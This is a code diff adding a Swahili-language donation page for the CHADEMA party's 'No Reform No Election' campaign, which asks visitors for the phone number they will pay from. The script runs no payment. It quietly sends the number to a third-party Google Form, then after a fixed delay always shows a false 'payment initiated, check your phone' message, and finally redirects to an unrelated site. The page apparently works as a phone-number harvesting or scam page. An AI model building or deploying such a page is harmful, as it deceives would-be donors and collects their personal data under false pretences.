@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Changia CHADEMA</title>
+  <link href="logo.svg.png" rel="icon" type="image/x-icon"/>
+
+  <style>
+    body {
+      background-image: url('back.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+    }
+
+    .container {
+      display: none;
+      text-align: center;
+      padding: 30px;
+      max-width: 500px;
+      margin: 50px auto;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      opacity: 0;
+      transform: translateY(-100px);
+      transition: all 1s ease;
+    }
+
+    .container.show {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .spinner, .payment-spinner {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #0047AB;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      z-index: 9999;
+    }
+
+    .payment-spinner {
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    img.logo {
+      max-width: 80px;
+      margin-bottom: 20px;
+    }
+
+    img.payment-logo {
+      max-width: 100%;
+      margin: 20px 0 10px;
+    }
+
+    h2 {
+      color: #000;
+      margin-bottom: 10px;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 20px;
+    }
+
+    input[type="tel"] {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
+
+    button {
+      margin-top: 20px;
+      background-color: #0047AB;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #002e7a;
+    }
+
+    .popup-container {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+    }
+
+    .popup-box {
+      background: #fff;
+      padding: 30px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    .popup-icon {
+      font-size: 50px;
+      color: #28a745;
+      margin-bottom: 15px;
+    }
+
+    .popup-box h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .popup-box p {
+      color: #555;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    .popup-box button {
+      padding: 10px 20px;
+      background-color: #0047AB;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .popup-box button:hover {
+      background-color: #003080;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Spinner on page load -->
+  <div class="spinner" id="pageSpinner"></div>
+
+  <!-- Spinner after clicking "CHANGIA SASA" -->
+  <div class="payment-spinner" id="paymentSpinner"></div>
+
+  <!-- Success popup -->
+  <div id="paymentPopup" class="popup-container">
+    <div class="popup-box">
+      <div class="popup-icon">✅</div>
+      <h2>Malipo Yameanzishwa</h2>
+      <p>Tafadhali angalia simu yako kuthibitisha malipo.</p>
+      <button onclick="closePopup()">Sawa</button>
+    </div>
+  </div>
+
+  <!-- Form -->
+  <div class="container" id="mainContent">
+    <img class="logo" src="logo.svg.png" alt="Logo" />
+    <h2>Changia <span style="color: red;">Tone Tone</span></h2>
+    <h2>Changia Operation ya <span style="color: blue;">No Reform No Election</span></h2>
+    <h3>Changia <span style="color: blue;">Tsh 2000/=</span> Tu</h3>
+    <p><strong>Ungana nasi kwa kutuchangia </strong><strong>#ToneTone</strong></p>
+    <p><strong>Hii itatupa nguvu kuendelea kupambana</strong></p>
+    <img class="payment-logo" src="mitandao.png" alt="Mitandao ya Malipo" />
+    <label for="phone">Namba ya Simu Yenye Hela Kuchangia*</label>
+    <input type="tel" id="phone" placeholder="Andika namba ya simu">
+    <button onclick="startManualPayment()">CHANGIA SASA</button>
+  </div>
+
+  <script>
+    // Show form after loading
+    window.onload = function () {
+      setTimeout(() => {
+        document.getElementById("pageSpinner").style.display = "none";
+        document.getElementById("mainContent").classList.add("show");
+      }, 2000);
+    };
+
+    function startManualPayment() {
+      const phone = document.getElementById("phone").value.trim();
+      if (!phone || phone.length < 9) {
+        alert("Tafadhali weka namba sahihi ya simu.");
+        return;
+      }
+
+      // Show spinner while submitting
+      document.getElementById("paymentSpinner").style.display = "block";
+
+      // Send phone to Google Form (replace these)
+      const formData = new FormData();
+      formData.append("entry.2038981830", phone);
+
+      fetch("https://docs.google.com/forms/d/e/1FAIpQLSc6PqJXIdaohuVNOS8wrsV9ZXWqEXCrhImkAKkm1ZQ38UNOEA/formResponse", {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      });
+
+      // Show popup after delay
+      setTimeout(() => {
+        document.getElementById("paymentSpinner").style.display = "none";
+        showPaymentPopup();
+      }, 10000);
+    }
+
+    function showPaymentPopup() {
+      document.getElementById("paymentPopup").style.display = "flex";
+    }
+
+    function closePopup() {
+      document.getElementById("paymentPopup").style.display = "none";
+      window.location.href = "https://mimihapa.com";
+    }
+  </script>
+</body>
+</html>
